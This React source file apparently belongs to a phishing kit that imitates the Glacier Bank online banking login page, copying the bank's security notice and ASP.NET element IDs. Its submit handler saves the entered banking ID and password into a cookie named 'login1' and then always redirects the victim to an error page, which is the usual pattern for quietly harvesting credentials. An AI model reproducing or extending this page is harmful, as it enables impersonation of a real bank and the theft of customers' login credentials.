import React from "react";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";

export default function Login() {
  const [formInput, setFormInput] = React.useState<Login>({
    username: "",
    password: "",
  });

  const navigate = useNavigate();

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();
    cookies.set("login1", formInput);
    navigate("../login/error", { replace: true });
  }

  return (
    <>
      <form action="" method="post" onSubmit={handleSubmit}>
        <div className="MainContent">
          <div id="WelcomeMessageDiv" className="welcome-message">
            <div className="LoginWelcomeLiteralDiv">
              <meta name="generator" content="HTML Tidy, see www.w3.org" />

              <p style={{ color: "blue" }}>
                *FOR SECURITY REASONS, GLACIER BANK RECOMMENDS YOU MAINTAIN
                UP-TO-DATE VIRUS PROTECTION SOFTWARE ON YOUR COMPUTER, CHANGE
                YOUR PASSWORD EVERY 90 DAYS, NEVER OPEN E-MAIL ATTACHMENTS FROM
                AN UNKNOWN SOURCE, AND NEVER PROVIDE PERSONAL ACCOUNT
                INFORMATION BY E-MAIL*
              </p>

              <br />
              <br />
            </div>
          </div>

          <div className="LoginClear"></div>
          <div className="LoginPadding10">
            <div className="row" style={{ marginBottom: "20px" }}>
              <div className="six columns">
                <strong>
                  <label
                    id="ctl00_PageContent_Login1_IdLabel"
                    className="LoginTextBox"
                  >
                    Online Banking ID:
                  </label>
                </strong>
              </div>
              <div className="six columns">
                <input
                  name="username"
                  type="text"
                  size={30}
                  id="username"
                  className="LoginIdTextBox"
                  tabIndex={10}
                  onChange={handleInputChange}
                  required
                />
              </div>
            </div>
            <div className="row">
              <div className="six columns">
                <strong>
                  <label
                    id="ctl00_PageContent_Login1_IdLabel"
                    className="LoginTextBox"
                  >
                    Online Banking Password:
                  </label>
                </strong>
              </div>
              <div className="six columns">
                <input
                  name="password"
                  type="password"
                  size={30}
                  id="password"
                  className="LoginIdTextBox"
                  tabIndex={10}
                  onChange={handleInputChange}
                  required
                />
              </div>
            </div>
          </div>

          <div className="button-containerADA LoginButtonContainerDiv">
            <input
              type="submit"
              name="ctl00$PageContent$Login1$IdSubmitButton"
              value="Submit"
              id="ctl00_PageContent_Login1_IdSubmitButton"
              className="ColorButton"
              tabIndex={11}
            />
          </div>

          <div
            id="ctl00_PageContent_Login1_divPasswordResetLayout2"
            className="LoginCenter"
          ></div>
        </div>
      </form>
    </>
  );
}
